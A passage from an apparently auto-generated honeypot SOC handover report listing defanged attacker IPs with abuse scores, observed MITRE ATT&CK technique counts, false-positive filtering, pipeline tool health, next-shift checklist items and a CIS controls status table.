| `20.118.27[.]151` | US | Microsoft Corporation | **100** ⚠️ | 16 |
| `104.244.79[.]113` | CH | BuyVM | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `160.119.66[.]206` | NL | HostMem | **100** ⚠️ | 50 |
| `45.148.10[.]61` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 267 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 257 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 69 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 63 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 43 |

---

## 🔕 False Positive Summary (77 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 15 |
| AbuseIPDB score 19 below threshold 25 | 5 |
| AbuseIPDB score 24 below threshold 25 | 7 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 417 cases |
| Tool 34  | Credential Extractor        | ✅ 5751 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 27 fingerprints |
| Tool 36  | Command Clustering          | ✅ 106 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 180 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 77 filtered (18.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 88 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 238 priority case(s) shown individually · 90 recon entry/entries in table (9 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-26T20:43:35Z_
